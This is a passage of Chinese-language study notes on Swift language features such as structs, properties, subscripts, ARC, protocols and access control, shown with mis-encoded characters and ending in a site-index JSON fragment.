æˆ‘ä»¬å¯ä»¥ä¸ºç»“æ„ä½“å®šä¹‰å±æ€§ï¼ˆå¸¸é‡ã€å˜é‡ï¼‰å’Œæ·»åŠ æ–¹æ³•ï¼Œä»è€Œæ‰©å±•ç»“æ„ä½“çš„åŠŸèƒ½ã€‚ ä¸ C å’Œ Objective C ä¸åŒçš„æ˜¯ï¼š ç»“æ„ä½“ä¸éœ€è¦åŒ…å«å®ç°æ–‡ä»¶å’Œæ¥å£ã€‚ ç»“æ„ä½“å…è®¸æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå•ä¸€æ–‡ä»¶ï¼Œä¸”ç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆé¢å‘å…¶å®ƒä»£ç çš„å¤–éƒ¨æ¥å£ã€‚ ç»“æ„ä½“æ€»æ˜¯é€šè¿‡è¢«å¤åˆ¶çš„æ–¹å¼åœ¨ä»£ç ä¸­ä¼ é€’ï¼Œå› æ­¤å®ƒçš„å€¼æ˜¯ä¸å¯ä¿®æ”¹çš„ã€‚ å€¼ä¼ é€’ é€šè¿‡å…³é”®å­— struct æ¥å®šä¹‰ç»“æ„ä½“: struct nameStruct { Definition 1 Definition 2 â€¦â€¦ Definition N } Swift ç±» åœ¨ä¸€ä¸ªå•ä¸€æ–‡ä»¶ä¸­å®šä¹‰ä¸€ä¸ªç±»ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨ç”Ÿæˆé¢å‘å…¶å®ƒä»£ç çš„å¤–éƒ¨æ¥å£ã€‚ æ’ç­‰è¿ç®—ç¬¦ åˆ¤å®šä¸¤ä¸ªå¸¸é‡æˆ–è€…å˜é‡æ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªç±»å®ä¾‹ï¼ŒSwift å†…å»ºäº†ä¸¤ä¸ªæ’ç­‰è¿ç®—ç¬¦ === : ä¸¤ä¸ªå¸¸é‡æˆ–è€…å˜é‡å¼•ç”¨åŒä¸€ä¸ªç±»å®ä¾‹åˆ™è¿”å› true !== : ä¸¤ä¸ªå¸¸é‡æˆ–è€…å˜é‡å¼•ç”¨ä¸åŒä¸€ä¸ªç±»å®ä¾‹åˆ™è¿”å› true Swift å±æ€§ å­˜å‚¨å±æ€§ ä¸€ä¸ªå­˜å‚¨å±æ€§å°±æ˜¯å­˜å‚¨åœ¨ç‰¹å®šç±»æˆ–ç»“æ„ä½“çš„å®ä¾‹é‡Œçš„ä¸€ä¸ªå¸¸é‡æˆ–å˜é‡ å»¶è¿Ÿå­˜å‚¨å±æ€§ å½“ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰ä¼šè®¡ç®—å…¶åˆå§‹å€¼çš„å±æ€§ åœ¨å±æ€§å£°æ˜å‰ä½¿ç”¨ lazy æ¥æ ‡ç¤ºä¸€ä¸ªå»¶è¿Ÿå­˜å‚¨å±æ€§, ä¸”å¿…é¡»å£°æ˜ä¸ºvarå˜é‡ ä¸€èˆ¬ç”¨äºï¼š å»¶è¿Ÿå¯¹è±¡çš„åˆ›å»ºã€‚ å½“å±æ€§çš„å€¼ä¾èµ–äºå…¶ä»–æœªçŸ¥ç±» è®¡ç®—å±æ€§ é™¤å­˜å‚¨å±æ€§å¤–ï¼Œç±»ã€ç»“æ„ä½“å’Œæšä¸¾å¯ä»¥å®šä¹‰è®¡ç®—å±æ€§ï¼Œè®¡ç®—å±æ€§ä¸ç›´æ¥å­˜å‚¨å€¼ï¼Œ è€Œæ˜¯æä¾›ä¸€ä¸ª getter æ¥è·å–å€¼ï¼Œä¸€ä¸ªå¯é€‰çš„ setter æ¥é—´æ¥è®¾ç½®å…¶ä»–å±æ€§æˆ–å˜é‡çš„å€¼ã€‚ åªè¯»è®¡ç®—å±æ€§ åªæœ‰ getter æ²¡æœ‰ setter çš„è®¡ç®—å±æ€§å°±æ˜¯åªè¯»è®¡ç®—å±æ€§ å±æ€§è§‚å¯Ÿå™¨ å±æ€§è§‚å¯Ÿå™¨ç›‘æ§å’Œå“åº”å±æ€§å€¼çš„å˜åŒ– ä¸éœ€è¦ä¸ºæ— æ³•é‡è½½çš„è®¡ç®—å±æ€§æ·»åŠ å±æ€§è§‚å¯Ÿå™¨ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡ setter ç›´æ¥ç›‘æ§å’Œå“åº”å€¼çš„å˜åŒ–ã€‚ å¯ä»¥ä¸ºå±æ€§æ·»åŠ å¦‚ä¸‹çš„ä¸€ä¸ªæˆ–å…¨éƒ¨è§‚å¯Ÿå™¨ï¼š willSetåœ¨è®¾ç½®æ–°çš„å€¼ä¹‹å‰è°ƒç”¨ didSetåœ¨æ–°çš„å€¼è¢«è®¾ç½®ä¹‹åç«‹å³è°ƒç”¨ willSetå’ŒdidSetè§‚å¯Ÿå™¨åœ¨å±æ€§åˆå§‹åŒ–è¿‡ç¨‹ä¸­ä¸ä¼šè¢«è°ƒç”¨ Swift æ–¹æ³• self å±æ€§ ç±»å‹çš„æ¯ä¸€ä¸ªå®ä¾‹éƒ½æœ‰ä¸€ä¸ªéšå«å±æ€§å«åšselfï¼Œself å®Œå…¨ç­‰åŒäºè¯¥å®ä¾‹æœ¬èº«ï¼Œ ç›¸å½“äºJavaçš„this åœ¨å®ä¾‹æ–¹æ³•ä¸­ä¿®æ”¹å€¼ç±»å‹ Swift è¯­è¨€ä¸­ç»“æ„ä½“å’Œæšä¸¾æ˜¯å€¼ç±»å‹ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå€¼ç±»å‹çš„å±æ€§ä¸èƒ½åœ¨å®ƒçš„å®ä¾‹æ–¹æ³•ä¸­è¢«ä¿®æ”¹ è‹¥ç¡®å®éœ€è¦ä¿®æ”¹ï¼Œ å¯ä»¥é€‰æ‹©å˜å¼‚(mutating)è¿™ä¸ªæ–¹æ³•ï¼Œç„¶åæ–¹æ³•å°±å¯ä»¥ä»æ–¹æ³•å†…éƒ¨æ”¹å˜å®ƒçš„å±æ€§ï¼› å¹¶ä¸”å®ƒåšçš„ä»»ä½•æ”¹å˜åœ¨æ–¹æ³•ç»“æŸæ—¶è¿˜ä¼šä¿ç•™åœ¨åŸå§‹ç»“æ„ä¸­ã€‚ æ–¹æ³•è¿˜å¯ä»¥ç»™å®ƒéšå«çš„selfå±æ€§èµ‹å€¼ä¸€ä¸ªå…¨æ–°çš„å®ä¾‹ï¼Œè¿™ä¸ªæ–°å®ä¾‹åœ¨æ–¹æ³•ç»“æŸåå°†æ›¿æ¢åŸæ¥çš„å®ä¾‹ åœ¨å¯å˜æ–¹æ³•ä¸­ç»™ self èµ‹å€¼ å¯å˜æ–¹æ³•èƒ½å¤Ÿèµ‹ç»™éšå«å±æ€§ self ä¸€ä¸ªå…¨æ–°çš„å®ä¾‹ã€‚ ç±»å‹æ–¹æ³• å°±æ˜¯ç±»æ–¹æ³• Swift ä¸‹æ ‡ æŸäº›æ–¹é¢ä¹Ÿå¯ä»¥ç†è§£ä¸ºå¢åŠ ç±»ä¼¼æ•°ç»„çš„åŠŸèƒ½ ä¸‹æ ‡è„šæœ¬å…è®¸ä½ é€šè¿‡åœ¨å®ä¾‹åé¢çš„æ–¹æ‹¬å·ä¸­ä¼ å…¥ä¸€ä¸ªæˆ–è€…å¤šä¸ªçš„ç´¢å¼•å€¼æ¥å¯¹å®ä¾‹è¿›è¡Œè®¿é—®å’Œèµ‹å€¼ã€‚ è¯­æ³•ç±»ä¼¼äºå®ä¾‹æ–¹æ³•å’Œè®¡ç®—å‹å±æ€§çš„æ··åˆã€‚ ä¸å®šä¹‰å®ä¾‹æ–¹æ³•ç±»ä¼¼ï¼Œå®šä¹‰ä¸‹æ ‡è„šæœ¬ä½¿ç”¨subscriptå…³é”®å­—ï¼Œæ˜¾å¼å£°æ˜å…¥å‚ï¼ˆä¸€ä¸ªæˆ–å¤šä¸ªï¼‰å’Œè¿”å›ç±»å‹ã€‚ ä¸å®ä¾‹æ–¹æ³•ä¸åŒçš„æ˜¯ä¸‹æ ‡è„šæœ¬å¯ä»¥è®¾å®šä¸ºè¯»å†™æˆ–åªè¯»ã€‚è¿™ç§æ–¹å¼åˆæœ‰ç‚¹åƒè®¡ç®—å‹å±æ€§çš„getterå’Œsetter: subscript(index: Int) -> Int { get { // ç”¨äºä¸‹æ ‡è„šæœ¬å€¼çš„å£°æ˜ } set(newValue) { // æ‰§è¡Œèµ‹å€¼æ“ä½œ } } å‚è€ƒ: https://www.runoob.com/swift/swift-subscripts.html å®ä¾‹: import Cocoa struct subexample { let decrementer: Int subscript(index: Int) -> Int { return decrementer / index } } let division = subexample(decrementer: 100) print(\"100 é™¤ä»¥ 9 ç­‰äº \\(division[9])\") print(\"100 é™¤ä»¥ 2 ç­‰äº \\(division[2])\") print(\"100 é™¤ä»¥ 3 ç­‰äº \\(division[3])\") print(\"100 é™¤ä»¥ 5 ç­‰äº \\(division[5])\") print(\"100 é™¤ä»¥ 7 ç­‰äº \\(division[7])\") ç”¨æ³• æ ¹æ®ä½¿ç”¨åœºæ™¯ä¸åŒä¸‹æ ‡è„šæœ¬ä¹Ÿå…·æœ‰ä¸åŒçš„å«ä¹‰ã€‚ é€šå¸¸ä¸‹æ ‡è„šæœ¬æ˜¯ç”¨æ¥è®¿é—®é›†åˆï¼ˆcollectionï¼‰ï¼Œåˆ—è¡¨ï¼ˆlistï¼‰æˆ–åºåˆ—ï¼ˆsequenceï¼‰ä¸­å…ƒç´ çš„å¿«æ·æ–¹å¼ã€‚ ä½ å¯ä»¥åœ¨ä½ è‡ªå·±ç‰¹å®šçš„ç±»æˆ–ç»“æ„ä½“ä¸­è‡ªç”±çš„å®ç°ä¸‹æ ‡è„šæœ¬æ¥æä¾›åˆé€‚çš„åŠŸèƒ½ã€‚ Swift ç»§æ‰¿ ç»§æ‰¿ ä½¿ç”¨å†’å· é‡å†™ï¼ˆOverridingï¼‰ å­ç±»å¯ä»¥é€šè¿‡ç»§æ‰¿æ¥çš„å®ä¾‹æ–¹æ³•ï¼Œç±»æ–¹æ³•ï¼Œå®ä¾‹å±æ€§ï¼Œ æˆ–ä¸‹æ ‡è„šæœ¬æ¥å®ç°è‡ªå·±çš„å®šåˆ¶åŠŸèƒ½ï¼Œæˆ‘ä»¬æŠŠè¿™ç§è¡Œä¸ºå«é‡å†™ï¼ˆoverridingï¼‰ã€‚ å­ç±»å¯ä»¥é€šè¿‡ç»§æ‰¿æ¥çš„å®ä¾‹æ–¹æ³•ï¼Œç±»æ–¹æ³•ï¼Œå®ä¾‹å±æ€§ï¼Œæˆ–ä¸‹æ ‡è„šæœ¬æ¥å®ç°è‡ªå·±çš„å®šåˆ¶åŠŸèƒ½ï¼Œ æŠŠè¿™ç§è¡Œä¸ºå«é‡å†™ï¼ˆoverridingï¼‰ã€‚ é˜²æ­¢é‡å†™ ä½¿ç”¨ final å…³é”®å­—é˜²æ­¢å®ƒä»¬è¢«é‡å†™ã€‚ Swift æ„é€ è¿‡ç¨‹ æ„é€ å‡½æ•°ä½¿ç”¨ init() æ–¹æ³• ç±»å®ä¾‹ä¹Ÿå¯ä»¥é€šè¿‡å®šä¹‰ææ„å™¨ï¼ˆdeinitializerï¼‰åœ¨ç±»å®ä¾‹é‡Šæ”¾ä¹‹å‰æ‰§è¡Œæ¸…ç†å†…å­˜çš„å·¥ä½œã€‚ å­˜å‚¨å‹å±æ€§çš„åˆå§‹èµ‹å€¼ ç±»å’Œç»“æ„ä½“åœ¨å®ä¾‹åˆ›å»ºæ—¶ï¼Œå¿…é¡»ä¸ºæ‰€æœ‰å­˜å‚¨å‹å±æ€§è®¾ç½®åˆé€‚çš„åˆå§‹å€¼ã€‚ å­˜å‚¨å±æ€§åœ¨æ„é€ å™¨ä¸­èµ‹å€¼æ—¶ï¼Œå®ƒä»¬çš„å€¼æ˜¯è¢«ç›´æ¥è®¾ç½®çš„ï¼Œä¸ä¼šè§¦å‘ä»»ä½•å±æ€§è§‚æµ‹å™¨ã€‚ å­˜å‚¨å±æ€§åœ¨æ„é€ å™¨ä¸­èµ‹å€¼æµç¨‹ï¼š åˆ›å»ºåˆå§‹å€¼ã€‚ åœ¨å±æ€§å®šä¹‰ä¸­æŒ‡å®šé»˜è®¤å±æ€§å€¼ã€‚ åˆå§‹åŒ–å®ä¾‹ï¼Œå¹¶è°ƒç”¨ init() æ–¹æ³•ã€‚ æ„é€ è¿‡ç¨‹ä¸­ä¿®æ”¹å¸¸é‡å±æ€§ åªè¦åœ¨æ„é€ è¿‡ç¨‹ç»“æŸå‰å¸¸é‡çš„å€¼èƒ½ç¡®å®šï¼Œä½ å¯ä»¥åœ¨æ„é€ è¿‡ç¨‹ä¸­çš„ä»»æ„æ—¶é—´ç‚¹ä¿®æ”¹å¸¸é‡å±æ€§çš„å€¼ å¯¹æŸä¸ªç±»å®ä¾‹æ¥è¯´ï¼Œå®ƒçš„å¸¸é‡å±æ€§åªèƒ½åœ¨å®šä¹‰å®ƒçš„ç±»çš„æ„é€ è¿‡ç¨‹ä¸­ä¿®æ”¹ï¼›ä¸èƒ½åœ¨å­ç±»ä¸­ä¿®æ”¹ã€‚ é»˜è®¤æ„é€ å™¨ é»˜è®¤æ„é€ å™¨å°†ç®€å•çš„åˆ›å»ºä¸€ä¸ªæ‰€æœ‰å±æ€§å€¼éƒ½è®¾ç½®ä¸ºé»˜è®¤å€¼çš„å®ä¾‹: ç»“æ„ä½“çš„é€ä¸€æˆå‘˜æ„é€ å™¨ å¦‚æœç»“æ„ä½“å¯¹æ‰€æœ‰å­˜å‚¨å‹å±æ€§æä¾›äº†é»˜è®¤å€¼ä¸”è‡ªèº«æ²¡æœ‰æä¾›å®šåˆ¶çš„æ„é€ å™¨ï¼Œ å®ƒä»¬èƒ½è‡ªåŠ¨è·å¾—ä¸€ä¸ªé€ä¸€æˆå‘˜æ„é€ å™¨ å¦‚: struct Rectangle { var length = 100.0, breadth = 200.0 } let area = Rectangle(length: 24.0, breadth: 32.0) print(\"çŸ©å½¢çš„é¢ç§¯: \\(area.length)\") print(\"çŸ©å½¢çš„é¢ç§¯: \\(area.breadth)\") å€¼ç±»å‹çš„æ„é€ å™¨ä»£ç† æ„é€ å™¨å¯ä»¥é€šè¿‡è°ƒç”¨å…¶å®ƒæ„é€ å™¨æ¥å®Œæˆå®ä¾‹çš„éƒ¨åˆ†æ„é€ è¿‡ç¨‹ã€‚ è¿™ä¸€è¿‡ç¨‹ç§°ä¸ºæ„é€ å™¨ä»£ç†ï¼Œå®ƒèƒ½å‡å°‘å¤šä¸ªæ„é€ å™¨é—´çš„ä»£ç é‡å¤ã€‚ æ„é€ å™¨çš„ç»§æ‰¿å’Œé‡è½½ Swift ä¸­çš„å­ç±»ä¸ä¼šé»˜è®¤ç»§æ‰¿çˆ¶ç±»çš„æ„é€ å™¨ã€‚ çˆ¶ç±»çš„æ„é€ å™¨ä»…åœ¨ç¡®å®šå’Œå®‰å…¨çš„æƒ…å†µä¸‹è¢«ç»§æ‰¿ã€‚ å½“ä½ é‡å†™ä¸€ä¸ªçˆ¶ç±»æŒ‡å®šæ„é€ å™¨æ—¶ï¼Œä½ éœ€è¦å†™overrideä¿®é¥°ç¬¦ å¯å¤±è´¥æ„é€ å™¨ å¯ä»¥åœ¨ä¸€ä¸ªç±»ï¼Œç»“æ„ä½“æˆ–æ˜¯æšä¸¾ç±»å‹çš„å®šä¹‰ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå¯å¤±è´¥æ„é€ å™¨ã€‚ å…¶è¯­æ³•ä¸ºåœ¨initå…³é”®å­—åé¢åŠ æ·»é—®å·(init?)ã€‚ Swift ææ„è¿‡ç¨‹ åœ¨ä¸€ä¸ªç±»çš„å®ä¾‹è¢«é‡Šæ”¾ä¹‹å‰ï¼Œææ„å‡½æ•°è¢«ç«‹å³è°ƒç”¨ã€‚ ç”¨å…³é”®å­—deinitæ¥æ ‡ç¤ºææ„å‡½æ•°ï¼Œç±»ä¼¼äºåˆå§‹åŒ–å‡½æ•°ç”¨initæ¥æ ‡ç¤ºã€‚ææ„å‡½æ•°åªé€‚ç”¨äºç±»ç±»å‹ã€‚ Swift å¯é€‰é“¾ å‚è€ƒ: https://www.runoob.com/swift/swift-optional-chaining.html è°ƒç”¨æ—¶å€™ä½¿ç”¨é—®å·/å¹å·ï¼Œ é—®å·è¡¨ç¤ºå¯èƒ½ä¸ºç©ºï¼Œ ä¸ºç©ºåˆ™ä¸ç»§ç»­è°ƒç”¨ å¹å·è¡¨ç¤ºå¼ºåˆ¶è°ƒç”¨ï¼ˆæœ€å¥½ç¡®å®šä¸€å®šå¯ä»¥è°ƒç”¨ï¼‰ æ³¨è§£ è¿™ç‚¹ä¸tsåŸºæœ¬ä¸€è‡´ Swift è‡ªåŠ¨å¼•ç”¨è®¡æ•°ï¼ˆARCï¼‰ Swift ä½¿ç”¨è‡ªåŠ¨å¼•ç”¨è®¡æ•°ï¼ˆARCï¼‰è¿™ä¸€æœºåˆ¶æ¥è·Ÿè¸ªå’Œç®¡ç†åº”ç”¨ç¨‹åºçš„å†…å­˜ é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬ä¸éœ€è¦å»æ‰‹åŠ¨é‡Šæ”¾å†…å­˜ï¼Œå› ä¸º ARC ä¼šåœ¨ç±»çš„å®ä¾‹ä¸å†è¢«ä½¿ç”¨æ—¶ï¼Œè‡ªåŠ¨é‡Šæ”¾å…¶å ç”¨çš„å†…å­˜ã€‚ ä½†åœ¨æœ‰äº›æ—¶å€™æˆ‘ä»¬è¿˜æ˜¯éœ€è¦åœ¨ä»£ç ä¸­å®ç°å†…å­˜ç®¡ç†ã€‚ ARC åŠŸèƒ½ å½“æ¯æ¬¡ä½¿ç”¨ init() æ–¹æ³•åˆ›å»ºä¸€ä¸ªç±»çš„æ–°çš„å®ä¾‹çš„æ—¶å€™ï¼ŒARC ä¼šåˆ†é…ä¸€å¤§å—å†…å­˜ç”¨æ¥å‚¨å­˜å®ä¾‹çš„ä¿¡æ¯ã€‚ å†…å­˜ä¸­ä¼šåŒ…å«å®ä¾‹çš„ç±»å‹ä¿¡æ¯ï¼Œä»¥åŠè¿™ä¸ªå®ä¾‹æ‰€æœ‰ç›¸å…³å±æ€§çš„å€¼ã€‚ å½“å®ä¾‹ä¸å†è¢«ä½¿ç”¨æ—¶ï¼ŒARC é‡Šæ”¾å®ä¾‹æ‰€å ç”¨çš„å†…å­˜ï¼Œå¹¶è®©é‡Šæ”¾çš„å†…å­˜èƒ½æŒªä½œä»–ç”¨ã€‚ ä¸ºäº†ç¡®ä¿ä½¿ç”¨ä¸­çš„å®ä¾‹ä¸ä¼šè¢«é”€æ¯ï¼ŒARC ä¼šè·Ÿè¸ªå’Œè®¡ç®—æ¯ä¸€ä¸ªå®ä¾‹æ­£åœ¨è¢«å¤šå°‘å±æ€§ï¼Œå¸¸é‡å’Œå˜é‡æ‰€å¼•ç”¨ã€‚ å®ä¾‹èµ‹å€¼ç»™å±æ€§ã€å¸¸é‡æˆ–å˜é‡ï¼Œå®ƒä»¬éƒ½ä¼šåˆ›å»ºæ­¤å®ä¾‹çš„å¼ºå¼•ç”¨ï¼Œåªè¦å¼ºå¼•ç”¨è¿˜åœ¨ï¼Œå®ä¾‹æ˜¯ä¸å…è®¸è¢«é”€æ¯çš„ã€‚ ç±»å®ä¾‹ä¹‹é—´çš„å¾ªç¯å¼ºå¼•ç”¨ å¾ªç¯å¼•ç”¨ï¼Œ æ°¸è¿œä¸ä¼šè¢«å›æ”¶ Swift æä¾›äº†ä¸¤ç§åŠæ³•ç”¨æ¥è§£å†³ä½ åœ¨ä½¿ç”¨ç±»çš„å±æ€§æ—¶æ‰€é‡åˆ°çš„å¾ªç¯å¼ºå¼•ç”¨é—®é¢˜ å¼±å¼•ç”¨: weak var å˜é‡ æ— ä¸»å¼•ç”¨: unowned let å˜é‡ å¼±å¼•ç”¨å’Œæ— ä¸»å¼•ç”¨å…è®¸å¾ªç¯å¼•ç”¨ä¸­çš„ä¸€ä¸ªå®ä¾‹å¼•ç”¨å¦å¤–ä¸€ä¸ªå®ä¾‹è€Œä¸ä¿æŒå¼ºå¼•ç”¨ã€‚ è¿™æ ·å®ä¾‹èƒ½å¤Ÿäº’ç›¸å¼•ç”¨è€Œä¸äº§ç”Ÿå¾ªç¯å¼ºå¼•ç”¨ã€‚ å¯¹äºç”Ÿå‘½å‘¨æœŸä¸­ä¼šå˜ä¸ºnilçš„å®ä¾‹ä½¿ç”¨å¼±å¼•ç”¨ã€‚ ç›¸åçš„ï¼Œå¯¹äºåˆå§‹åŒ–èµ‹å€¼åå†ä¹Ÿä¸ä¼šè¢«èµ‹å€¼ä¸ºnilçš„å®ä¾‹ï¼Œä½¿ç”¨æ— ä¸»å¼•ç”¨ã€‚ å¾ªç¯å¼ºå¼•ç”¨è¿˜ä¼šå‘ç”Ÿåœ¨å½“ä½ å°†ä¸€ä¸ªé—­åŒ…èµ‹å€¼ç»™ç±»å®ä¾‹çš„æŸä¸ªå±æ€§ï¼Œ å¹¶ä¸”è¿™ä¸ªé—­åŒ…ä½“ä¸­åˆä½¿ç”¨äº†å®ä¾‹ Swift ç±»å‹è½¬æ¢ Swift è¯­è¨€ç±»å‹è½¬æ¢å¯ä»¥åˆ¤æ–­å®ä¾‹çš„ç±»å‹ã€‚ä¹Ÿå¯ä»¥ç”¨äºæ£€æµ‹å®ä¾‹ç±»å‹æ˜¯å¦å±äºå…¶çˆ¶ç±»æˆ–è€…å­ç±»çš„å®ä¾‹ã€‚ is: æ£€æµ‹å€¼çš„ç±»å‹ as: è½¬æ¢ç±»å‹ å‘ä¸‹è½¬å‹ å‘ä¸‹è½¬å‹ï¼Œç”¨ç±»å‹è½¬æ¢æ“ä½œç¬¦(as? æˆ– as!) å½“ä½ ä¸ç¡®å®šå‘ä¸‹è½¬å‹å¯ä»¥æˆåŠŸæ—¶ï¼Œç”¨ç±»å‹è½¬æ¢çš„æ¡ä»¶å½¢å¼(as?)ã€‚ æ¡ä»¶å½¢å¼çš„ç±»å‹è½¬æ¢æ€»æ˜¯è¿”å›ä¸€ä¸ªå¯é€‰å€¼ï¼ˆoptional valueï¼‰ï¼Œ å¹¶ä¸”è‹¥ä¸‹è½¬æ˜¯ä¸å¯èƒ½çš„ï¼Œå¯é€‰å€¼å°†æ˜¯ nilã€‚ åªæœ‰ä½ å¯ä»¥ç¡®å®šå‘ä¸‹è½¬å‹ä¸€å®šä¼šæˆåŠŸæ—¶ï¼Œæ‰ä½¿ç”¨å¼ºåˆ¶å½¢å¼(as!)ã€‚ å½“ä½ è¯•å›¾å‘ä¸‹è½¬å‹ä¸ºä¸€ä¸ªä¸æ­£ç¡®çš„ç±»å‹æ—¶ï¼Œå¼ºåˆ¶å½¢å¼çš„ç±»å‹è½¬æ¢ä¼šè§¦å‘ä¸€ä¸ªè¿è¡Œæ—¶é”™è¯¯ã€‚ Anyå’ŒAnyObjectçš„ç±»å‹è½¬æ¢ Swiftä¸ºä¸ç¡®å®šç±»å‹æä¾›äº†ä¸¤ç§ç‰¹æ®Šç±»å‹åˆ«åï¼š AnyObjectå¯ä»¥ä»£è¡¨ä»»ä½•classç±»å‹çš„å®ä¾‹ã€‚ Anyå¯ä»¥è¡¨ç¤ºä»»ä½•ç±»å‹ï¼ŒåŒ…æ‹¬æ–¹æ³•ç±»å‹ï¼ˆfunction typesï¼‰ã€‚ åªæœ‰å½“ä½ æ˜ç¡®çš„éœ€è¦å®ƒçš„è¡Œä¸ºå’ŒåŠŸèƒ½æ—¶æ‰ä½¿ç”¨Anyå’ŒAnyObjectã€‚ åœ¨ä½ çš„ä»£ç é‡Œä½¿ç”¨ä½ æœŸæœ›çš„æ˜ç¡®çš„ç±»å‹æ€»æ˜¯æ›´å¥½çš„ã€‚ Swift æ‰©å±• æ‰©å±•å°±æ˜¯å‘ä¸€ä¸ªå·²æœ‰çš„ç±»ã€ç»“æ„ä½“æˆ–æšä¸¾ç±»å‹æ·»åŠ æ–°åŠŸèƒ½ã€‚ æ‰©å±•å¯ä»¥å¯¹ä¸€ä¸ªç±»å‹æ·»åŠ æ–°çš„åŠŸèƒ½ï¼Œä½†æ˜¯ä¸èƒ½é‡å†™å·²æœ‰çš„åŠŸèƒ½ã€‚ è¯­æ³• æ‰©å±•å£°æ˜ä½¿ç”¨å…³é”®å­— extension: extension SomeType { // åŠ åˆ°SomeTypeçš„æ–°åŠŸèƒ½å†™åˆ°è¿™é‡Œ } ä¸€ä¸ªæ‰©å±•å¯ä»¥æ‰©å±•ä¸€ä¸ªå·²æœ‰ç±»å‹ï¼Œä½¿å…¶èƒ½å¤Ÿé€‚é…ä¸€ä¸ªæˆ–å¤šä¸ªåè®®ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹: extension SomeType: SomeProtocol, AnotherProctocol { // åè®®å®ç°å†™åˆ°è¿™é‡Œ } ä¸‹é¢çš„ä¾‹å­å‘ Int ç±»å‹æ·»åŠ äº† 5 ä¸ªè®¡ç®—å‹å®ä¾‹å±æ€§å¹¶æ‰©å±•å…¶åŠŸèƒ½: extension Int { var add: Int {return self + 100 } var sub: Int { return self - 10 } var mul: Int { return self * 10 } var div: Int { return self / 5 } } let addition = 3.add print(\"åŠ æ³•è¿ç®—åçš„å€¼ï¼š\\(addition)\") Swift åè®® åº”è¯¥å°±æ˜¯æ¥å£å§ åè®®çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹: protocol SomeProtocol { // åè®®å†…å®¹ } è¦ä½¿ç±»éµå¾ªæŸä¸ªåè®®ï¼Œéœ€è¦åœ¨ç±»å‹åç§°ååŠ ä¸Šåè®®åç§°ï¼Œä¸­é—´ä»¥å†’å·:åˆ†éš”. éµå¾ªå¤šä¸ªåè®®æ—¶ï¼Œå„åè®®ä¹‹é—´ç”¨é€—å·,åˆ†éš”: struct SomeStructure: FirstProtocol, AnotherProtocol { // ç»“æ„ä½“å†…å®¹ } å¦‚æœç±»åœ¨éµå¾ªåè®®çš„åŒæ—¶æ‹¥æœ‰çˆ¶ç±»ï¼Œåº”è¯¥å°†çˆ¶ç±»åæ”¾åœ¨åè®®åä¹‹å‰ï¼Œä»¥é€—å·åˆ†éš”: class SomeClass: SomeSuperClass, FirstProtocol, AnotherProtocol { // ç±»çš„å†…å®¹ } ç±»ä¸“å±åè®® å¯ä»¥åœ¨åè®®çš„ç»§æ‰¿åˆ—è¡¨ä¸­,é€šè¿‡æ·»åŠ classå…³é”®å­—,é™åˆ¶åè®®åªèƒ½é€‚é…åˆ°ç±»ï¼ˆclassï¼‰ç±»å‹ã€‚ è¯¥classå…³é”®å­—å¿…é¡»æ˜¯ç¬¬ä¸€ä¸ªå‡ºç°åœ¨åè®®çš„ç»§æ‰¿åˆ—è¡¨ä¸­ï¼Œå…¶åï¼Œæ‰æ˜¯å…¶ä»–ç»§æ‰¿åè®®ã€‚æ ¼å¼å¦‚ä¸‹: protocol SomeClassOnlyProtocol: class, SomeInheritedProtocol { // åè®®å®šä¹‰ } Swift æ³›å‹ ç±»å‹çº¦æŸ å…³è”ç±» ä½¿ç”¨ associatedtype å…³é”®å­—æ¥è®¾ç½®å…³è”ç±»å‹å®ä¾‹ Where è¯­å¥ å¯ä»¥åœ¨å‚æ•°åˆ—è¡¨ä¸­é€šè¿‡whereè¯­å¥å®šä¹‰å‚æ•°çš„çº¦æŸ Swift è®¿é—®æ§åˆ¶ public å¯ä»¥è®¿é—®è‡ªå·±æ¨¡å—ä¸­æºæ–‡ä»¶é‡Œçš„ä»»ä½•å®ä½“ï¼Œåˆ«äººä¹Ÿå¯ä»¥é€šè¿‡å¼•å…¥è¯¥æ¨¡å—æ¥è®¿é—®æºæ–‡ä»¶é‡Œçš„æ‰€æœ‰å®ä½“ã€‚ internal å¯ä»¥è®¿é—®è‡ªå·±æ¨¡å—ä¸­æºæ–‡ä»¶é‡Œçš„ä»»ä½•å®ä½“ï¼Œä½†æ˜¯åˆ«äººä¸èƒ½è®¿é—®è¯¥æ¨¡å—ä¸­æºæ–‡ä»¶é‡Œçš„å®ä½“ã€‚ fileprivate æ–‡ä»¶å†…ç§æœ‰ï¼Œåªèƒ½åœ¨å½“å‰æºæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚ private åªèƒ½åœ¨ç±»ä¸­è®¿é—®ï¼Œç¦»å¼€äº†è¿™ä¸ªç±»æˆ–è€…ç»“æ„ä½“çš„ä½œç”¨åŸŸå¤–é¢å°±æ— æ³•è®¿é—®ã€‚ æšä¸¾ç±»å‹è®¿é—®æƒé™ æšä¸¾ä¸­æˆå‘˜çš„è®¿é—®çº§åˆ«ç»§æ‰¿è‡ªè¯¥æšä¸¾ï¼Œä½ ä¸èƒ½ä¸ºæšä¸¾ä¸­çš„æˆå‘˜å•ç‹¬ç”³æ˜ä¸åŒçš„è®¿é—®çº§åˆ«ã€‚ å­ç±»è®¿é—®æƒé™ å­ç±»çš„è®¿é—®çº§åˆ«ä¸å¾—é«˜äºçˆ¶ç±»çš„è®¿é—®çº§åˆ«ã€‚ æ¯”å¦‚è¯´ï¼Œçˆ¶ç±»çš„è®¿é—®çº§åˆ«æ˜¯ internalï¼Œå­ç±»çš„è®¿é—®çº§åˆ«å°±ä¸èƒ½ç”³æ˜ä¸º publicã€‚","tags":"åç«¯; swift","url":"/yq-backend-swift-course-lan.html","loc":"/yq-backend-swift-course-lan.html"},{"title":"å®˜æ–¹åº“","text":"UIKit ç§»åŠ¨ç«¯ç”¨ Cocoa OS xæ¡Œé¢ç«¯ç”¨ åŒ…å« AppKit: å®˜æ–¹æ–‡æ¡£: https://developer.apple.com/documentation/appkit Foundation SwiftUI è¾ƒæ–°çš„æ¡†æ¶, 